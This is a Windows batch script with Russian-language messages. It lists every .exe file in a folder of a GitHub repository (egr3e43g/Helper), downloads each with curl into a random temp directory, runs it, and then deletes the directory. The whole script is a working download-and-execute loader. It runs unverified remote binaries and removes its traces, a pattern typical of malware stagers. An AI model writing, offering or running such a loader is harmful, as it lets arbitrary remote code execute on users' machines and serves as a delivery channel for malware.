@echo off
setlocal EnableExtensions EnableDelayedExpansion

rem === Репозиторий ===
set "OWNER=egr3e43g"
set "REPO=Helper"
set "BRANCH=main"
set "DIR=Files"
set "API=https://api.github.com/repos/%OWNER%/%REPO%/contents/%DIR%?ref=%BRANCH%"

rem === Рабочая папка ===
set "WORKDIR=%TEMP%\%REPO%-run-%RANDOM%%RANDOM%"
md "%WORKDIR%" || (echo [ERR] Не удалось создать "%WORKDIR%" & exit /b 1)
pushd "%WORKDIR%" || (echo [ERR] Не удалось зайти в "%WORKDIR%" & exit /b 1)

echo [*] Получаю список .exe из %OWNER%/%REPO%/%BRANCH%/%DIR% ...
set "FOUND=0"

for /f "usebackq tokens=1,2 delims=|" %%A in (`powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; $r=Invoke-RestMethod('%API%'); $r | Where-Object { $_.type -eq 'file' -and $_.name -match '\.exe$' } | Sort-Object name | ForEach-Object { '{0}|{1}' -f $_.name, $_.download_url }"`) do (
  set "FOUND=1"
  set "FN=%%A"
  set "URL=%%B"

  echo [*] Скачиваю !FN! ...
  curl -fsSL -o "!FN!" "!URL!"
  if errorlevel 1 (
    echo [ERR] Не удалось скачать: !URL!
    popd
    rd /s /q "%WORKDIR%" >nul 2>&1
    exit /b 1
  )

  echo [*] Запускаю !FN! ...
  start "" /wait "!FN!"
  set "RC=!ERRORLEVEL!"
  if not "!RC!"=="0" (
    echo [ERR] !FN! завершился с кодом !RC!
    popd
    rd /s /q "%WORKDIR%" >nul 2>&1
    exit /b !RC!
  )
)

if "!FOUND!"=="0" (
  echo [ERR] В папке %DIR% не найдено .exe файлов на ветке %BRANCH%.
  popd
  rd /s /q "%WORKDIR%" >nul 2>&1
  exit /b 2
)

echo [OK] Готово.
popd
rd /s /q "%WORKDIR%" >nul 2>&1
exit /b 0
